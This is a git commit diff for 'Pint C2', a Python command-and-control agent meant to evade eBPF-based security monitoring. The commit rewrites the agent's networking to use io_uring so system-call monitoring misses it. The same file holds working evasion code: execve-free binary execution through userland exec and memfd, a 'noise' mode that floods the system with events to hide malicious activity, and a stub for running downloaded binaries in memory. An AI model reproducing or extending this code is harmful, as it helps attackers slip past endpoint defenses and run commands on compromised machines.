eeb98f03d43c4a1500d763ab4b7a94928a2f9cb7
Siren <siren@kernal.eu>
2024-03-13 03:22:32 +0200

    Use liburing for networking

--- README.md
+++ README.md
@@ -1,8 +1,14 @@
 # Pint C2
-This is a C2 that uses various techniques to evade from eBPF based security monitoring
+This is a C2 that uses various techniques to evade from eBPF based security monitoring.
 
 ## Features
 
 * [Userland exec / reflective ELF loading](https://grugq.github.io/docs/ul_exec.txt).
 * Event spamming / resource exhaustion.
-* Networking using io_uring to evade system call monitoring. - TODO
+* Sockets and TCP connection using io_uring.
+
+## Commands
+
+* `ulexec [command]`
+* `memfd [command]`
+* `noise [on/off]`
--- client.py
+++ client.py
@@ -5,92 +5,89 @@ import os
 import sys
 from multiprocessing.pool import ThreadPool
 import shutil
+from liburing import io_uring, io_uring_cqes, io_uring_queue_init, io_uring_queue_exit, \
+        iovec, io_uring_get_sqe, io_uring_wait_cqe, io_uring_submit, io_uring_cqe_seen, \
+        trap_error, io_uring_prep_socket, io_uring_prep_write, io_uring_prep_read, \
+        io_uring_prep_close, io_uring_prep_connect, AF_INET, SOCK_STREAM, sockaddr_in
 
-from ulexecve.ulexecve import ELFExecutor
+from ulexecve import ELFExecutor, MemFdExecutor
 
 # Default noise activiy
 noise_cmd = "touch /tmp/kek"
+bufsize = 4096
 
 def main():
     server_ip = '127.0.0.1'
     server_port = 12345
-    bufsize = 4096
-
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.settimeout(10)
     server_seen = False
-
-    # Generate events to mask off malicious activity
     noise = False
-    # utilize all cores
     cpu_cores = os.cpu_count()
     pool = ThreadPool(processes=cpu_cores)
-
     message = "ready"
+    ring = io_uring()
+    cqes = io_uring_cqes()
+
+    io_uring_queue_init(8, ring, 0)
+    agent_socket = socket(ring, cqes)
+    addr, addrlen = sockaddr_in(server_ip, server_port)
+    connect(ring, cqes, agent_socket, addr, addrlen)
 
     while True:
-        client_socket.sendto(message.encode(), (server_ip, server_port))
+        write(ring, cqes, agent_socket, message.encode('utf-8'))
         message = "ready"
+        response = read(ring, cqes, agent_socket, bufsize)
+        cmd = response.decode('utf-8').rstrip()
+        if len(cmd) < 1:
+            continue
 
-        # Receive response from the server
-        try:
-            response, server_address = client_socket.recvfrom(bufsize)
-        except TimeoutError:
-            # Server has run away. Oh no, anyways.
-            pass
+        print("Received from server:", cmd)
+        if not server_seen:
+            server_seen = True
+        if cmd == "exit":
+            break
         else:
-            cmd = response.decode().rstrip()
-            print("Received from server:", cmd)
-            if not server_seen:
-                server_seen = True
-            if cmd == "exit":
-                break
-            else:
-                tokenized = cmd.split(None)
-                print(tokenized)
+            tokenized = cmd.split(None)
+            print(tokenized)
 
-                # Fill the event buffer to hide malicious activity
-                if tokenized[0] == "noise":
-                    if tokenized[1] == "on":
-                        if noise:
-                            message = "Noise is already on"
-                        else:
-                            noise = True
-                            for x in range(cpu_cores):
-                                print("launching worker")
-                                pool.apply(make_noise)
+            # Fill the event buffer to hide malicious activity
+            if tokenized[0] == "noise":
+                if tokenized[1] == "on":
+                    if noise:
+                        message = "Noise is already on"
                     else:
-                        pool.shutdown(wait=False)
-                        noise = False
-                    continue
+                        noise = True
+                        for x in range(cpu_cores):
+                            print("launching worker")
+                            pool.apply(make_noise)
+                else:
+                    pool.shutdown(wait=False)
+                    noise = False
+                continue
 
-                # Execute binaries without execve system call
-                elif tokenized[0] == "ulexec" or tokenized[0] == "memfd":
-                    exec_res = userland_exec(tokenized)
+            # Execute binaries without execve system call
+            elif tokenized[0] == "ulexec" or tokenized[0] == "memfd":
+                message = userland_exec(tokenized)
 
-                # Download binaries from the internet, store in memory and execute
-                elif tokenized[0] == "dl":
-                    # For now, this action is performed with standard TCP functions
-                    # like connect() and so on. This will most likely get detected.
-                    yn = input("This action is bad OPSEC. Continue? [Y/N]: ")
-                    if yn != "Y":
-                        continue # TODO
+            # Download binaries from the internet, store in memory and execute
+            elif tokenized[0] == "dl":
+                # For now, this action is performed with standard TCP functions
+                # like connect() and so on. This will most likely get detected.
+                yn = input("This action is bad OPSEC. Continue? [Y/N]: ")
+                if yn != "Y":
+                    continue # TODO
 
     # Close the connection
-    client_socket.close()
+    close(ring, cqes, agent_socket)
 
 def make_noise():
     while True:
         os.system(noise_cmd)
 
-if __name__ == "__main__":
-    main()
-
 def userland_exec(tokenized):
     binpath = shutil.which(tokenized[1])
     if binpath is None:
         message = "No such binary on host"
-        continue
+        return
     print("requested binary path: " + binpath)
     binfd = open(binpath, "rb")
     executor = None
@@ -124,3 +121,44 @@ def userland_exec(tokenized):
         else:
             message = "ERR"
     return message
+
+def socket(ring, cqes):
+    sqe = io_uring_get_sqe(ring)
+    io_uring_prep_socket(sqe, AF_INET, SOCK_STREAM, 0, 0)
+    return submit_and_wait(ring, cqes)
+
+def connect(ring, cqes, fd, sockaddr, socklen):
+    sqe = io_uring_get_sqe(ring)
+    io_uring_prep_connect(sqe, fd, sockaddr, socklen)
+    return submit_and_wait(ring, cqes)
+
+def write(ring, cqes, fd, data, offset=0):
+    buffer = bytearray(data)
+    iov = iovec(buffer)
+    sqe = io_uring_get_sqe(ring)
+    io_uring_prep_write(sqe, fd, iov[0].iov_base, iov[0].iov_len, offset)
+    return submit_and_wait(ring, cqes)
+
+def read(ring, cqes, fd, length, offset=0):
+    buffer = bytearray(length)
+    iov = iovec(buffer)
+    sqe = io_uring_get_sqe(ring)
+    io_uring_prep_read(sqe, fd, iov[0].iov_base, iov[0].iov_len, offset)
+    read_length = submit_and_wait(ring, cqes)
+    return buffer[:read_length]
+
+def close(ring, cqes, fd):
+    sqe = io_uring_get_sqe(ring)
+    io_uring_prep_close(sqe, fd)                  
+    submit_and_wait(ring, cqes)
+
+def submit_and_wait(ring, cqes):
+    io_uring_submit(ring)
+    io_uring_wait_cqe(ring, cqes)
+    cqe = cqes[0]
+    result = trap_error(cqe.res)
+    io_uring_cqe_seen(ring, cqe)
+    return result
+
+if __name__ == "__main__":
+    main()
